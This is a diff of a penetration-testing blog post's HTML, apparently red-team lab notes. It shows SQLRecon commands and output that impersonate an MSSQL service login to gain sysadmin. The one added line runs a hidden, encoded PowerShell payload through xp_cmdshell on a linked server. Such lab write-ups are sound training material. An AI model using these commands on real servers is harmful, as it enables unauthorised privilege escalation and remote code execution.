@@ -33,7 +33,7 @@
 <meta property="og:description" content="迟来的文章">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-02-08T03:15:20.000Z">
-<meta property="article:modified_time" content="2024-02-26T16:07:18.781Z">
+<meta property="article:modified_time" content="2024-02-26T16:16:17.733Z">
 <meta property="article:author" content="xXxYOLOxXx">
 <meta property="article:tag" content="Pentest">
 <meta name="twitter:card" content="summary">
@@ -209,7 +209,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-02-27 00:07:18" itemprop="dateModified" datetime="2024-02-27T00:07:18+08:00">2024-02-27</time>
+                <time title="Modified: 2024-02-27 00:16:17" itemprop="dateModified" datetime="2024-02-27T00:16:17+08:00">2024-02-27</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1411,6 +1411,7 @@ Windows Server 2019 won’t allow you to connect to another user’s session wit
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\Sqlrecon.exe &#x2F;a:wintoken &#x2F;h:sql-2.dev.cyberbotic.io &#x2F;m:query &#x2F;c:&quot;select * from sys.server_principals where principal_id&#x3D;267 or principal_id&#x3D;268&quot;</span><br><span class="line"></span><br><span class="line">name | principal_id | sid | type | type_desc | is_disabled | create_date | modify_date | default_database_name | default_language_name | credential_id | owning_principal_id | is_fixed_role | </span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">DEV\mssql_svc | 267 | System.Byte[] | U | WINDOWS_LOGIN | False | 1&#x2F;20&#x2F;2023 4:30:36 PM | 1&#x2F;20&#x2F;2023 4:30:36 PM | master | us_english |  |  | False | </span><br><span class="line">DEV\Domain Users | 268 | System.Byte[] | G | WINDOWS_GROUP | False | 1&#x2F;20&#x2F;2023 4:32:54 PM | 1&#x2F;20&#x2F;2023 4:32:54 PM | master | us_english |  |  | False |</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.\Sqlrecon.exe &#x2F;a:wintoken &#x2F;h:sql-2.dev.cyberbotic.io &#x2F;m:query &#x2F;c:&quot;select system_user, is_srvrolemember(&#39;sysadmin&#39;);&quot;</span><br><span class="line"></span><br><span class="line">column0 | column1 | </span><br><span class="line">--------------------</span><br><span class="line">DEV\bfarmer | 0 |</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.\Sqlrecon.exe &#x2F;a:wintoken &#x2F;h:sql-2.dev.cyberbotic.io &#x2F;m:query &#x2F;c:&quot;execute as login &#x3D; &#39;dev\mssql_svc&#39;; select system_user, is_srvrolemember(&#39;sysadmin&#39;);&quot;</span><br><span class="line"></span><br><span class="line">column0 | column1 | </span><br><span class="line">--------------------</span><br><span class="line">DEV\mssql_svc | 1 |</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Sqlrecon.exe &#x2F;a:wintoken &#x2F;h:sql-2.dev.cyberbotic.io &#x2F;m:query &#x2F;c:&quot;exec(&#39;xp_cmdshell &#39;&#39;powershell -w hidden -enc $payload&#39;&#39;&#39;) at [sql-1.cyberbotic.io]&quot;</span><br></pre></td></tr></table></figure>
 <h3 id="printnightmare"><a class="markdownIt-Anchor" href="#printnightmare"></a> PrintNightmare</h3>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a><br />
